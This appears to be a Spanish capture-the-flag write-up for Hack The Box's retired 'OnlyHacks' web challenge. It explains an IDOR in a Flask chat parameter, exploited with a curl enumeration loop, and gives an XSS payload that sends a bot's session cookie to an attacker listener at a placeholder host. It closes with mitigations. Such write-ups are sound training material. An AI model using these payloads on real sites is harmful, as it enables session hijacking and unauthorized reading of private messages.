---
challenge: OnlyHacks
category: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, idor, xss, flask, bot]
type: Web
---

# OnlyHacks — Hack The Box

[⚑ English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de análisis; el flag no se publica.

## Enunciado

Una red social para «hackers» con registro abierto. El objetivo es el flag, y la pista está en la mensajería privada entre usuarios.

## Reconocimiento

```bash
gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt
```

Rutas típicas del reto: `/register`, `/login`, `/dashboard`, `/profile`, `/chat`, `/report`. La aplicación es **Flask** con sesión en cookie firmada.

## Vía principal: IDOR en el chat

El identificador del hilo viaja en la URL:

```text
/chat?rid=2      -> conversación propia
/chat?rid=3      -> conversación de otro usuario
```

Cambiar `rid` a mano devuelve el hilo ajeno sin comprobar la propiedad: **IDOR** puro. El flag aparece dentro de la conversación del usuario `Dimitris`, tal cual, sin explotar nada más.

```bash
for i in $(seq 1 10); do
  curl -s -b "session=<cookie>" "http://<IP>:<PORT>/chat?rid=$i" | grep -o "HTB{[^}]*}"
done
```

> El orden importa: el IDOR es la vía documentada. La ficha antigua lo presentaba como alternativa del XSS e invertía el peso de las dos.

## Vía alternativa: XSS contra el bot

El reto incluye un botón de «reportar perfil» que un bot llamado **Renata** visita. Si el perfil refleja el campo sin escapar, el XSS se ejecuta en el navegador del bot; el objetivo sería exfiltrar su cookie de sesión a un listener propio.

```html
<script>new Image().src="http://<LHOST>:8000/?c="+document.cookie</script>
```

```bash
python3 -m http.server 8000
```

Funciona como camino secundario, pero es más frágil: depende de que el bot visite el perfil y de la política de cookies. Para este reto no hace falta.

## Conclusiones

- **IDOR** por parámetro numérico: el fallo es no comprobar que el hilo pertenece al usuario de la sesión.
- El XSS contra el bot es una vía real pero accesoria en este reto.
- La mensajería privada es un objetivo clásico: concentra información que el resto de la aplicación no muestra.

## Lecciones

- Enumerar identificadores secuenciales es el primer test de control de acceso.
- Un `?rid=` que acepta cualquier entero es una puerta abierta.
- Mitigación: autorización por objeto en el servidor, IDs no predecibles y escape de salida con CSP para el XSS.
